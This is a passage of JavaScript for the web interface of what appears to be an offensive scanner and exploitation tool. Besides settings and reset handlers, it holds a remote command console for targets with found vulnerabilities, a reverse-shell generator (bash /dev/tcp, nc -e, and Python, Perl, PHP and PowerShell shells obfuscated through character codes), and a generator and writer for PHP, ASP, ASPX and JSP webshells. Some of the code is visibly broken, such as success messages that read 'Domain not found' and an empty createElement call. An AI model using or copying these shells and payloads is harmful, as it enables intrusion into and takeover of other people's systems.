        dir_wordlist: getVal('settingsDirWordlist', ''),
        archive_threshold: getInt('settingsArchiveThreshold', 30),
        adv_output_format: getVal('settingsOutputFormat', 'html'),
        adv_output_dir: getVal('settingsOutputDir', './reports'),
        
        dict_archive_threshold: getInt('dictArchiveThreshold', 30),
        max_retention: getInt('dictMaxRetention', 30),
        smart_dict: getChecked('optSmartDictGlobal', true),
        dict_dir_wordlist: getVal('dictDirWordlist', ''),
        dict_param_wordlist: getVal('dictParamWordlist', ''),
        
        verify_ssl: getChecked('optVerifySSLGlobal', false),
        prefer_https: getChecked('optPreferHTTPSGlobal', true),
        harmless: getChecked('optHarmlessGlobal', false)
    };
    
    try {
        var response = await fetch('/api/settings', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(settings)
        });
        
        var data = await response.json();
        
        if (data.success) {
            if (newPassword && newPassword.value) {
                await fetch('/api/settings/password', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ password: newPassword.value })
                });
                newPassword.value = '';
                if (confirmPassword) confirmPassword.value = '';
            }
            alert(safeT('common.settingsSaved', 'Settings saved successfully'));
        } else {
            alert(data.error || safeT('common.error', 'Error occurred'));
        }
    } catch (error) {
        alert(safeT('common.saveFailed', 'Failed to save settings') + ': ' + error.message);
    }
}

function resetSettingsForm() {
    loadSettings();
}

async function loadDictStats() {
    try {
        var response = await fetch('/api/dict/stats');
        var data = await response.json();
        
        if (data.success) {
            var el;
            el = document.getElementById('dictTotalEntries');
            if (el) el.textContent = data.total || 0;
            el = document.getElementById('dictArchivedEntries');
            if (el) el.textContent = data.archived || 0;
            el = document.getElementById('dictActiveEntries');
            if (el) el.textContent = data.active || 0;
        }
    } catch (error) {
        console.error('Failed to load dict stats:', error);
    }
}

async function resetDictMemory() {
    showConfirm(safeT('common.error', 'Error') || 'Reset all dictionary memory? This cannot be undone.', async function() {
        try {
            var response = await fetch('/api/dict/reset', { method: 'POST' });
            var data = await response.json();
            
            if (data.success) {
                alert(safeT('common.error', 'Domain not found'));
                loadDictStats();
            } else {
                alert(data.error || 'Error');
            }
        } catch (error) {
            alert('Failed: ' + error.message);
        }
    });
}

async function resetScanHistory() {
    showConfirm(safeT('common.error', 'Error') || 'Reset all scan history? This cannot be undone.', async function() {
        try {
            var response = await fetch('/api/history/clear', { method: 'POST' });
            var data = await response.json();
            
            if (data.success) {
                alert(safeT('common.error', 'Domain not found'));
            } else {
                alert(data.error || 'Error');
            }
        } catch (error) {
            alert('Failed: ' + error.message);
        }
    });
}

async function resetReports() {
    showConfirm(safeT('common.error', 'Error') || 'Delete all saved reports? This cannot be undone.', async function() {
        try {
            var response = await fetch('/api/reports/clear', { method: 'POST' });
            var data = await response.json();
            
            if (data.success) {
                alert(safeT('common.error', 'Domain not found'));
                loadReports();
            } else {
                alert(data.error || 'Error');
            }
        } catch (error) {
            alert('Failed: ' + error.message);
        }
    });
}

async function resetAllSettings() {
    showConfirm(safeT('common.error', 'Error') || 'Reset all settings to default? This cannot be undone.', async function() {
        try {
            var response = await fetch('/api/settings/reset', { method: 'POST' });
            var data = await response.json();
            
            if (data.success) {
                alert(safeT('common.error', 'Domain not found'));
                loadSettings();
            } else {
                alert(data.error || 'Error');
            }
        } catch (error) {
            alert('Failed: ' + error.message);
        }
    });
}

async function factoryReset() {
    showConfirm(safeT('common.error', 'Error') || 'Factory reset? This will delete ALL data and settings. This cannot be undone.', async function() {
        try {
            var response = await fetch('/api/factory-reset', { method: 'POST' });
            var data = await response.json();
            
            if (data.success) {
                alert(safeT('common.error', 'Domain not found'));
                window.location.reload();
            } else {
                alert(data.error || 'Error');
            }
        } catch (error) {
            alert('Failed: ' + error.message);
        }
    });
}

function showConfirm(message, callback) {
    var modal = document.getElementById('confirmModal');
    var msgEl = document.getElementById('confirmMessage');
    var btn = document.getElementById('confirmBtn');
    
    if (msgEl) msgEl.textContent = message;
    if (modal) modal.classList.add('show');
    
    confirmCallback = callback;
    
    if (btn) {
        btn.onclick = function() {
            closeConfirmModal();
            if (confirmCallback) confirmCallback();
        };
    }
}

function closeConfirmModal() {
    var modal = document.getElementById('confirmModal');
    if (modal) modal.classList.remove('show');
    confirmCallback = null;
}

function escapeHtml(text) {
    if (!text) return '';
    return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

var selectedVuln = null;
var cmdHistory = [];
var cmdHistoryIndex = -1;
var operationLogs = [];

function showExploitTab(tabName, event) {
    if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
    }
    
    document.querySelectorAll('.exploit-tab').forEach(function(t) {
        t.classList.remove('active');
    });
    document.querySelectorAll('.exploit-panel').forEach(function(p) {
        p.classList.remove('active');
    });
    
    if (event && event.target) {
        var tab = event.target.closest('a');
        if (tab) {
            tab.classList.add('active');
        }
    }
    
    var panel = document.getElementById('exploit-' + tabName);
    if (panel) {
        panel.classList.add('active');
    }
    
    if (tabName === 'shell') {
        generateReverseShell();
    } else if (tabName === 'webshell') {
        updateWebshellPreview();
    } else if (tabName === 'logs') {
        loadOperationLogs();
    }
}

async function refreshVulnList() {
    try {
        var response = await fetch('/api/vulns');
        var data = await response.json();
        
        if (data.success) {
            renderVulnList(data.vulns || []);
        }
    } catch (error) {
        console.error('Failed to load vulns:', error);
    }
}

function renderVulnList(vulns) {
    var list = document.getElementById('vulnSelectList');
    
    if (!list) return;
    
    var filter = document.getElementById('vulnFilterSeverity') ? document.getElementById('vulnFilterSeverity').value : 'all';
    var filteredVulns = filter === 'all' ? vulns : vulns.filter(function(v) { return v.severity === filter; });
    
    if (!filteredVulns || filteredVulns.length === 0) {
        list.innerHTML = '<div class="empty-state"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg><p>' + safeT('results.noResults', 'No results') + '</p></div>';
        return;
    }
    
    var groupedVulns = {};
    filteredVulns.forEach(function(v, i) {
        var key = (v.target || v.url) + '|' + (v.parameter || '');
        if (!groupedVulns[key]) {
            groupedVulns[key] = {
                target: v.target || v.url,
                parameter: v.parameter || '',
                severity: v.severity || 'medium',
                type: v.type || v.vuln_type || 'RCE',
                payloads: [],
                originalIndex: i,
                count: 0
            };
        }
        if (v.payload || v.match) {
            groupedVulns[key].payloads.push(v.payload || v.match);
        }
        groupedVulns[key].count++;
        if ((v.severity || 'medium') === 'critical' || (v.severity || 'medium') === 'high') {
            groupedVulns[key].severity = v.severity;
        }
    });
    
    var uniqueVulns = Object.values(groupedVulns);
    
    var html = '';
    uniqueVulns.forEach(function(v, i) {
        var severityClass = (v.severity || 'medium').toLowerCase();
        var vulnType = v.type || 'RCE';
        var payloadPreview = v.payloads.length > 0 ? v.payloads[0] : '';
        if (payloadPreview.length > 30) {
            payloadPreview = payloadPreview.substring(0, 30) + '...';
        }
        var countBadge = v.count > 1 ? '<span class="vuln-count-badge">' + v.count + '</span>' : '';
        
        html += '<div class="vuln-select-item ' + severityClass + '" onclick="selectVuln(' + v.originalIndex + ')" data-index="' + v.originalIndex + '">' +
            '<div class="vuln-item-header">' +
            '<span class="vuln-item-severity ' + severityClass + '">' + (v.severity || 'Medium') + '</span>' +
            '<span class="vuln-item-type">' + escapeHtml(vulnType) + '</span>' +
            countBadge +
            '</div>' +
            '<div class="vuln-item-url">' + escapeHtml(v.target) + '</div>' +
            '<div class="vuln-item-param">Param: <strong>' + escapeHtml(v.parameter || '-') + '</strong></div>' +
            '<div class="vuln-item-payload" title="' + escapeHtml(v.payloads.join(', ')) + '">Payload: ' + escapeHtml(payloadPreview) + (v.payloads.length > 1 ? ' (+' + (v.payloads.length - 1) + ' more)' : '') + '</div>' +
            '</div>';
    });
    
    list.innerHTML = html;
    window.currentVulnList = filteredVulns;
}

function filterVulnList() {
    if (window.currentVulnList) {
        renderVulnList(window.currentVulnList);
    } else {
        refreshVulnList();
    }
}

function selectVuln(index) {
    if (!window.currentVulnList || !window.currentVulnList[index]) return;
    
    selectedVuln = window.currentVulnList[index];
    
    document.querySelectorAll('.vuln-select-item').forEach(function(item) { item.classList.remove('active'); });
    var selectedItem = document.querySelector('.vuln-select-item[data-index="' + index + '"]');
    if (selectedItem) selectedItem.classList.add('active');
    
    var targetUrl = document.getElementById('cmdTargetUrl');
    if (targetUrl) {
        targetUrl.textContent = selectedVuln.target || selectedVuln.url;
    }
    
    var cmdOutput = document.getElementById('cmdOutput');
    if (cmdOutput) {
        cmdOutput.innerHTML = '<div class="cmd-welcome"><span>' + safeT('exploit.connected', 'Connected to target. Ready to execute commands.') + '</span></div>';
    }
}

function insertQuickCmd(cmd) {
    var input = document.getElementById('cmdInput');
    if (input) {
        input.value = cmd;
        input.focus();
    }
}

function handleCmdKeydown(event) {
    if (event.key === 'Enter' && !event.shiftKey) {
        event.preventDefault();
        executeCommand();
    } else if (event.key === 'ArrowUp') {
        event.preventDefault();
        if (cmdHistoryIndex < cmdHistory.length - 1) {
            cmdHistoryIndex++;
            document.getElementById('cmdInput').value = cmdHistory[cmdHistory.length - 1 - cmdHistoryIndex];
        }
    } else if (event.key === 'ArrowDown') {
        event.preventDefault();
        if (cmdHistoryIndex > 0) {
            cmdHistoryIndex--;
            document.getElementById('cmdInput').value = cmdHistory[cmdHistory.length - 1 - cmdHistoryIndex];
        } else if (cmdHistoryIndex === 0) {
            cmdHistoryIndex = -1;
            document.getElementById('cmdInput').value = '';
        }
    }
}

async function executeCommand() {
    var input = document.getElementById('cmdInput');
    var cmd = input ? input.value.trim() : '';
    
    if (!cmd) return;
    if (!selectedVuln) {
        alert(safeT('common.error', 'Domain not found'));
        return;
    }
    
    cmdHistory.push(cmd);
    cmdHistoryIndex = -1;
    input.value = '';
    
    var output = document.getElementById('cmdOutput');
    if (output) {
        output.innerHTML += '<div class="cmd-line input">$ ' + escapeHtml(cmd) + '</div>';
    }
    
    try {
        var response = await fetch('/api/exploit/cmd', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                vuln_id: selectedVuln.id || selectedVuln.target,
                target: selectedVuln.target || selectedVuln.url,
                parameter: selectedVuln.parameter,
                command: cmd,
                os: document.getElementById('targetOSType') ? document.getElementById('targetOSType').value : 'auto'
            })
        });
        
        var data = await response.json();
        
        if (data.success) {
            if (output) {
                output.innerHTML += '<div class="cmd-line output">' + escapeHtml(data.output || data.result || 'Command executed') + '</div>';
            }
            addOperationLog('cmd', cmd, selectedVuln.target);
        } else {
            if (output) {
                output.innerHTML += '<div class="cmd-line error">Error: ' + escapeHtml(data.error || 'Execution failed') + '</div>';
            }
        }
        
        if (output) {
            output.scrollTop = output.scrollHeight;
        }
    } catch (error) {
        if (output) {
            output.innerHTML += '<div class="cmd-line error">Error: ' + escapeHtml(error.message) + '</div>';
        }
    }
}

function generateReverseShell() {
    var ip = document.getElementById('shellListenIP') ? document.getElementById('shellListenIP').value : '0.0.0.0';
    var port = document.getElementById('shellListenPort') ? document.getElementById('shellListenPort').value : '4444';
    var shellType = document.querySelector('input[name="shellType"]:checked') ? document.querySelector('input[name="shellType"]:checked').value : 'bash';
    var targetOS = document.getElementById('shellTargetOS') ? document.getElementById('shellTargetOS').value : 'linux';
    
    var cmd = '';
    
    switch (shellType) {
        case 'bash':
            cmd = 'bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1';
            break;
        case 'python':
            cmd = String.fromCharCode(112,121,116,104,111,110,32,45,99,32,39,105,109,112,111,114,116,32,115,111,99,107,101,116,44,115,117,98,112,114,111,99,101,115,115,44,111,115,59,115,61,115,111,99,107,101,116,46,115,111,99,107,101,116,40,115,111,99,107,101,116,46,65,70,95,73,78,69,84,44,115,111,99,107,101,116,46,83,79,67,75,95,83,84,82,69,65,77,41,59,115,46,99,111,110,110,101,99,116,40,40,34) + ip + String.fromCharCode(34,44) + port + String.fromCharCode(41,41,59,111,115,46,100,117,112,50,40,115,46,102,105,108,101,110,111,40,41,44,48,41,59,111,115,46,100,117,112,50,40,115,46,102,105,108,101,110,111,40,41,44,49,41,59,111,115,46,100,117,112,50,40,115,46,102,105,108,101,110,111,40,41,44,50,41,59,115,117,98,112,114,111,99,101,115,115,46,99,97,108,108,40,91,34,47,98,105,110,47,115,104,34,44,34,45,105,34,93,41,39);
            break;
        case 'perl':
            cmd = String.fromCharCode(112,101,114,108,32,45,101,32,39,117,115,101,32,83,111,99,107,101,116,59,36,105,61,34) + ip + String.fromCharCode(34,59,36,112,61) + port + String.fromCharCode(59,115,111,99,107,101,116,40,83,44,80,70,95,73,78,69,84,44,83,79,67,75,95,83,84,82,69,65,77,44,103,101,116,112,114,111,116,111,98,121,110,97,109,101,40,34,116,99,112,34,41,41,59,105,102,40,99,111,110,110,101,99,116,40,83,44,115,111,99,107,97,100,100,114,95,105,110,40,36,112,44,105,110,101,116,95,97,116,111,110,40,36,105,41,41,41,41,41,123,111,112,101,110,40,83,84,68,73,78,44,34,62,38,83,34,41,59,111,112,101,110,40,83,84,68,79,85,84,44,34,62,38,83,34,41,59,111,112,101,110,40,83,84,68,69,82,82,44,34,62,38,83,34,41,59,101,120,101,99,40,34,47,98,105,110,47,115,104,32,45,105,34,41,59,125,59,39);
            break;
        case 'php':
            cmd = String.fromCharCode(112,104,112,32,45,114,32,39,36,115,111,99,107,61,102,115,111,99,107,111,112,101,110,40,34) + ip + String.fromCharCode(34,44) + port + String.fromCharCode(41,59,101,120,101,99,40,34,47,98,105,110,47,115,104,32,45,105,32,60,38,51,32,62,38,51,32,50,62,38,51,34,41,59,39);
            break;
        case 'nc':
            cmd = 'nc -e /bin/sh ' + ip + ' ' + port;
            break;
        case 'powershell':
            cmd = String.fromCharCode(112,111,119,101,114,115,104,101,108,108,32,45,110,111,112,32,45,99,32,34,36,99,108,105,101,110,116,32,61,32,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116,40,39) + ip + String.fromCharCode(39,44) + port + String.fromCharCode(41,59,36,115,116,114,101,97,109,32,61,32,36,99,108,105,101,110,116,46,71,101,116,83,116,114,101,97,109,40,41,59,91,98,121,116,101,91,93,93,36,98,121,116,101,115,32,61,32,48,46,46,54,53,53,51,53,124,37,123,48,125,59,119,104,105,108,101,40,40,36,105,32,61,32,36,115,116,114,101,97,109,46,82,101,97,100,40,36,98,121,116,101,115,44,32,48,44,32,36,98,121,116,101,115,46,76,101,110,103,116,104,41,41,32,45,110,101,32,48,41,123,59,36,100,97,116,97,32,61,32,40,78,101,119,45,79,98,106,101,99,116,32,45,84,121,112,101,78,97,109,101,32,83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103,41,46,71,101,116,83,116,114,105,110,103,40,36,98,121,116,101,115,44,48,44,32,36,105,41,59,36,115,101,110,100,98,97,99,107,32,61,32,40,105,101,120,32,36,100,97,116,97,32,50,62,38,49,32,124,32,79,117,116,45,83,116,114,105,110,103,32,41,59,36,115,101,110,100,98,97,99,107,50,32,61,32,36,115,101,110,100,98,97,99,107,32,43,32,39,80,83,32,39,32,43,32,40,112,119,100,41,46,80,97,116,104,32,43,32,39,62,32,39,59,36,115,101,110,100,98,121,116,101,32,61,32,40,91,116,101,120,116,46,101,110,99,111,100,105,110,103,93,58,58,65,83,67,73,73,41,46,71,101,116,66,121,116,101,115,40,36,115,101,110,100,98,97,99,107,50,41,59,36,115,116,114,101,97,109,46,87,114,105,116,101,40,36,115,101,110,100,98,121,116,101,44,48,44,36,115,101,110,100,98,121,116,101,46,76,101,110,103,116,104,41,59,36,115,116,114,101,97,109,46,70,108,117,115,104,40,41,125,59,36,99,108,105,101,110,116,46,67,108,111,115,101,40,41,34);
            break;
        case 'cmd':
            cmd = String.fromCharCode(99,109,100,46,101,120,101,32,47,99,32,112,111,119,101,114,115,104,101,108,108,32,45,110,111,112,32,45,99,32,34,36,99,108,105,101,110,116,32,61,32,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116,40,39) + ip + String.fromCharCode(39,44) + port + String.fromCharCode(41,59,36,115,116,114,101,97,109,32,61,32,36,99,108,105,101,110,116,46,71,101,116,83,116,114,101,97,109,40,41,59,91,98,121,116,101,91,93,93,36,98,121,116,101,115,32,61,32,48,46,46,54,53,53,51,53,124,37,123,48,125,59,119,104,105,108,101,40,40,36,105,32,61,32,36,115,116,114,101,97,109,46,82,101,97,100,40,36,98,121,116,101,115,44,32,48,44,32,36,98,121,116,101,115,46,76,101,110,103,116,104,41,41,32,45,110,101,32,48,41,123,59,36,100,97,116,97,32,61,32,40,78,101,119,45,79,98,106,101,99,116,32,45,84,121,112,101,78,97,109,101,32,83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103,41,46,71,101,116,83,116,114,105,110,103,40,36,98,121,116,101,115,44,48,44,32,36,105,41,59,36,115,101,110,100,98,97,99,107,32,61,32,40,105,101,120,32,36,100,97,116,97,32,50,62,38,49,32,124,32,79,117,116,45,83,116,114,105,110,103,32,41,59,36,115,101,110,100,98,97,99,107,50,32,61,32,36,115,101,110,100,98,97,99,107,32,43,32,39,80,83,32,39,32,43,32,40,112,119,100,41,46,80,97,116,104,32,43,32,39,62,32,39,59,36,115,101,110,100,98,121,116,101,32,61,32,40,91,116,101,120,116,46,101,110,99,111,100,105,110,103,93,58,58,65,83,67,73,73,41,46,71,101,116,66,121,116,101,115,40,36,115,101,110,100,98,97,99,107,50,41,59,36,115,116,114,101,97,109,46,87,114,105,116,101,40,36,115,101,110,100,98,121,116,101,44,48,44,36,115,101,110,100,98,121,116,101,46,76,101,110,103,116,104,41,59,36,115,116,114,101,97,109,46,70,108,117,115,104,40,41,125,59,36,99,108,105,101,110,116,46,67,108,111,115,101,40,41,34);
            break;
        case 'java':
            cmd = 'Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1"})';
            break;
        default:
            cmd = 'bash -i >& /dev/tcp/' + ip + '/' + port + ' 0>&1';
    }
    
    var output = document.getElementById('shellCommandOutput');
    if (output) {
        output.textContent = cmd;
    }
    
    var listenCmd = document.getElementById('listenCommand');
    if (listenCmd) {
        if (targetOS === 'windows') {
            listenCmd.textContent = 'nc -lvnp ' + port;
        } else {
            listenCmd.textContent = 'nc -lvnp ' + port;
        }
    }
}

function setPort(port) {
    var portInput = document.getElementById('shellListenPort');
    if (portInput) {
        portInput.value = port;
        generateReverseShell();
    }
}

async function getLocalIP() {
    try {
        var response = await fetch('/api/local-ip');
        var data = await response.json();
        
        if (data.success && data.ip) {
            var ipInput = document.getElementById('shellListenIP');
            if (ipInput) {
                ipInput.value = data.ip;
                generateReverseShell();
            }
        }
    } catch (error) {
        console.error('Failed to get local IP:', error);
    }
}

function copyShellCommand() {
    var cmd = document.getElementById('shellCommandOutput') ? document.getElementById('shellCommandOutput').textContent : '';
    if (cmd) {
        navigator.clipboard.writeText(cmd).then(function() {
            alert(safeT('common.error', 'Domain not found'));
        });
    }
}

function copyListenCommand() {
    var cmd = document.getElementById('listenCommand') ? document.getElementById('listenCommand').textContent : '';
    if (cmd) {
        navigator.clipboard.writeText(cmd).then(function() {
            alert(safeT('common.error', 'Domain not found'));
        });
    }
}

function updateWebshellPreview() {
    var lang = document.getElementById('webshellLang') ? document.getElementById('webshellLang').value : 'php';
    var password = document.getElementById('webshellPassword') ? document.getElementById('webshellPassword').value : 'pass';
    var type = document.querySelector('input[name="webshellType"]:checked') ? document.querySelector('input[name="webshellType"]:checked').value : 'simple';
    
    var customGroup = document.getElementById('customWebshellGroup');
    if (customGroup) {
        customGroup.style.display = type === 'custom' ? 'block' : 'none';
    }
    
    var code = '';
    
    if (type === 'custom') {
        code = document.getElementById('customWebshellCode') ? document.getElementById('customWebshellCode').value : '';
    } else {
        switch (lang) {
            case 'php':
                if (type === 'bypass') {
                    code = String.fromCharCode(60,63,112,104,112,10,36,97,61,39) + password + String.fromCharCode(39,59,10,36,98,61,115,116,114,95,114,101,112,108,97,99,101,40,39,120,39,44,39,39,44,39,97,120,115,120,115,120,101,120,114,120,116,39,41,59,10,105,102,40,105,115,115,101,116,40,36,95,80,79,83,84,91,36,97,93,41,41,123,10,32,32,32,32,36,98,40,36,95,80,79,83,84,91,36,97,93,41,59,10,125,10,63,62);
                } else {
                    code = String.fromCharCode(60,63,112,104,112,10,64,101,118,97,108,40,36,95,80,79,83,84,91,39) + password + String.fromCharCode(39,93,41,59,10,63,62);
                }
                break;
            case 'asp':
                code = String.fromCharCode(60,37,10,100,105,109,32,112,97,115,115,119,111,114,100,10,112,97,115,115,119,111,114,100,32,61,32,34) + password + String.fromCharCode(34,10,105,102,32,114,101,113,117,101,115,116,46,102,111,114,109,40,112,97,115,115,119,111,114,100,41,32,60,62,32,34,34,32,116,104,101,110,10,32,32,32,32,101,120,101,99,117,116,101,40,114,101,113,117,101,115,116,46,102,111,114,109,40,112,97,115,115,119,111,114,100,41,41,10,101,110,100,32,105,102,10,37,62);
                break;
            case 'aspx':
                code = String.fromCharCode(60,37,64,32,80,97,103,101,32,76,97,110,103,117,97,103,101,61,34,74,115,99,114,105,112,116,34,37,62,10,60,37,10,118,97,114,32,112,97,115,115,119,111,114,100,32,61,32,34) + password + String.fromCharCode(34,59,10,105,102,40,82,101,113,117,101,115,116,46,70,111,114,109,91,112,97,115,115,119,111,114,100,93,32,33,61,32,110,117,108,108,41,32,123,10,32,32,32,32,101,118,97,108,40,82,101,113,117,101,115,116,46,70,111,114,109,91,112,97,115,115,119,111,114,100,93,44,32,34,117,110,115,97,102,101,34,41,59,10,125,10,37,62);
                break;
            case 'jsp':
                code = String.fromCharCode(60,37,64,32,112,97,103,101,32,105,109,112,111,114,116,61,34,106,97,118,97,46,117,116,105,108,46,42,44,106,97,118,97,46,105,111,46,42,34,32,37,62,10) +
                    '<%\\n' +
                    'String password = "' + password + '";\\n' +
                    'if(request.getParameter(password) != null) {\\n' +
                    '    String cmd = request.getParameter(password);\\n' +
                    '    Process p = Runtime.getRuntime().exec(cmd);\\n' +
                    '    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\\n' +
                    '    String line;\\n' +
                    '    while((line = br.readLine()) != null) {\\n' +
                    '        out.println(line);\\n' +
                    '    }\\n' +
                    '}\\n' +
                    '%>';
                break;
        }
    }
    
    var output = document.getElementById('webshellCodeOutput');
    if (output) {
        output.textContent = code;
    }
    
    var filenameInput = document.getElementById('webshellFilename');
    if (filenameInput) {
        var extMap = { php: 'php', asp: 'asp', aspx: 'aspx', jsp: 'jsp' };
        filenameInput.value = 'shell.' + (extMap[lang] || 'php');
    }
}

function checkPasswordStrength() {
    var password = document.getElementById('webshellPassword') ? document.getElementById('webshellPassword').value : '';
    var strengthEl = document.getElementById('passwordStrength');
    
    if (!strengthEl) return;
    
    var strength = 'weak';
    if (password.length >= 8 && /[A-Z]/.test(password) && /[0-9]/.test(password)) {
        strength = 'strong';
    } else if (password.length >= 6) {
        strength = 'medium';
    }
    
    strengthEl.className = 'password-strength ' + strength;
    strengthEl.querySelector('.strength-text').textContent = strength.charAt(0).toUpperCase() + strength.slice(1);
}

function copyWebshell() {
    var code = document.getElementById('webshellCodeOutput') ? document.getElementById('webshellCodeOutput').textContent : '';
    if (code) {
        navigator.clipboard.writeText(code).then(function() {
            alert(safeT('common.error', 'Domain not found'));
        });
    }
}

async function writeWebshell() {
    if (!selectedVuln) {
        alert(safeT('exploit.selectVuln', 'Please select a vulnerability first'));
        return;
    }
    
    var code = document.getElementById('webshellCodeOutput') ? document.getElementById('webshellCodeOutput').textContent : '';
    var path = document.getElementById('webshellWritePath') ? document.getElementById('webshellWritePath').value : '.';
    var filename = document.getElementById('webshellFilename') ? document.getElementById('webshellFilename').value : 'shell.php';
    var password = document.getElementById('webshellPassword') ? document.getElementById('webshellPassword').value : 'pass';
    var webshellType = 'simple';
    
    var typeInputs = document.querySelectorAll('input[name="webshellType"]');
    typeInputs.forEach(function(input) {
        if (input.checked) {
            webshellType = input.value;
        }
    });
    
    if (path === '') {
        path = '.';
    }
    if (filename === '') {
        filename = 'shell.php';
    }
    
    showConfirm('Write webshell to target? This is a sensitive operation.', async function() {
        try {
            var response = await fetch('/api/exploit/webshell', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    vuln_id: selectedVuln.id || selectedVuln.target,
                    target: selectedVuln.target || selectedVuln.url,
                    parameter: selectedVuln.parameter,
                    code: code,
                    path: path,
                    filename: filename,
                    webshell_type: webshellType,
                    password: password
                })
            });
            
            var data = await response.json();
            
            if (data.success) {
                var msg = 'Webshell written successfully!\n';
                msg += 'URL: ' + data.webshell_url + '\n';
                msg += 'Password: ' + data.password;
                alert(msg);
                addOperationLog('webshell', 'Write: ' + filename + ' to ' + path, selectedVuln.target);
            } else {
                alert('Error: ' + (data.error || 'Unknown error'));
            }
        } catch (error) {
            alert('Failed: ' + error.message);
        }
    });
}

function addOperationLog(type, content, target) {
    var log = {
        type: type,
        content: content,
        target: target,
        time: new Date().toISOString()
    };
    
    operationLogs.push(log);
    localStorage.setItem('operationLogs', JSON.stringify(operationLogs));
}

function loadOperationLogs() {
    var stored = localStorage.getItem('operationLogs');
    operationLogs = stored ? JSON.parse(stored) : [];
    renderOperationLogs();
}

function renderOperationLogs() {
    var list = document.getElementById('logsList');
    
    if (!list) return;
    
    var filter = document.getElementById('logTypeFilter') ? document.getElementById('logTypeFilter').value : 'all';
    var filteredLogs = filter === 'all' ? operationLogs : operationLogs.filter(function(l) { return l.type === filter; });
    
    if (!filteredLogs || filteredLogs.length === 0) {
        list.innerHTML = '<div class="empty-state"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg><p>' + safeT('results.noResults', 'No results') + '</p></div>';
        return;
    }
    
    var html = '';
    filteredLogs.reverse().forEach(function(log) {
        var time = new Date(log.time).toLocaleString();
        html += '<div class="log-item ' + log.type + '">' +
            '<div class="log-item-header">' +
            '<span class="log-item-type">' + log.type.toUpperCase() + '</span>' +
            '<span class="log-item-time">' + time + '</span>' +
            '</div>' +
            '<div class="log-item-content">' + escapeHtml(log.content) + '</div>' +
            '<div class="log-item-target">Target: ' + escapeHtml(log.target) + '</div>' +
            '</div>';
    });
    
    list.innerHTML = html;
}

function filterLogs() {
    renderOperationLogs();
}

function exportLogs() {
    var logs = JSON.stringify(operationLogs, null, 2);
    var blob = new Blob([logs], { type: 'application/json' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('');
    a.href = url;
    a.download = 'operation_logs_' + new Date().toISOString().split('\n')[0] + '.json';
    a.click();
    URL.revokeObjectURL(url);
}

function clearLogs() {
    showConfirm(safeT('common.error', 'Error') || 'Clear all operation logs?', function() {
        operationLogs = [];
        localStorage.removeItem('operationLogs');
        renderOperationLogs();
    });
}
`


